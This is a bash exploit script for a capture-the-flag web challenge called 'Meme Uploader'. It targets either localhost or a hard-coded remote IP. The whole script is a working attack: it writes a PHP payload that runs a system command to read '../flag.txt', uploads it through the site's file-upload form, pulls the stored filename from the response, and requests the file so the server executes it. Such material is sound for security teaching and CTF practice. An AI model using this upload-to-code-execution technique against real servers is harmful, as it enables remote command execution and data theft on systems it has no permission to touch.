#!/bin/bash

PORT=8003

if [[ $1 == "local" ]]
then
    URL='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]
then
    URL='http://141.85.224.105:'$PORT
elif [[ $# -ne 2 ]]
then
    echo "Usage:"
    echo $0" {local,remote}"
    echo "or"
    echo $0" <ip> <port>"
    exit 1
else
    URL=$1':'$2
fi

# Meme Uploader

echo "Starting exploit for Meme Uploader..."

echo "Will use a random filename to avoid conflicts with existing filenames on the server..."
FILENAME="6HSisrykyD0846rdg.php"

echo "Writing the payload content to $FILENAME on disk..."
echo '<?php echo system("cat ../flag.txt"); ?>' > $FILENAME

echo "Uploading it on the server..."
OUTPUT=$(curl -s -F "fileToUpload=@${FILENAME}" -F 'submit=Upload meme' $URL)

echo "Extracting the new filename (hashed)..."
NEW_FILENAME=$(echo $OUTPUT | sed 's/.*Your file \([^ ]*\).*/\1/')

echo "Deleting locally generated file..."
rm "$FILENAME"

echo "Accessing the file on the server..."
echo "Flag is:"
curl "$URL"'/uploads/'"$NEW_FILENAME" || echo "Could not get flag. Most probably upload failed (a filename with the same name exists"
